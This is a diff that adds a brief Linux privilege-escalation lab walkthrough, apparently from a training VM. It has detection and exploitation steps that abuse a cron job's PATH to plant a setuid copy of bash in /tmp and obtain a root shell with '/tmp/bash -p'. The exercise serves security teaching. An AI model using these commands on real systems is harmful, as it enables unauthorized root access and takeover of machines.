@@ -1,0 +1,22 @@
+Detection
+
+Linux VM
+
+In command prompt type: cat /etc/crontab
+
+From the output, notice the value of the “PATH” variable.
+
+Exploitation
+
+Linux VM
+
+In command prompt type:
+echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > /home/user/overwrite.sh
+
+In command prompt type: chmod +x /home/user/overwrite.sh
+
+Wait 1 minute for the Bash script to execute.
+
+In command prompt type: /tmp/bash -p
+
+In command prompt type: id 
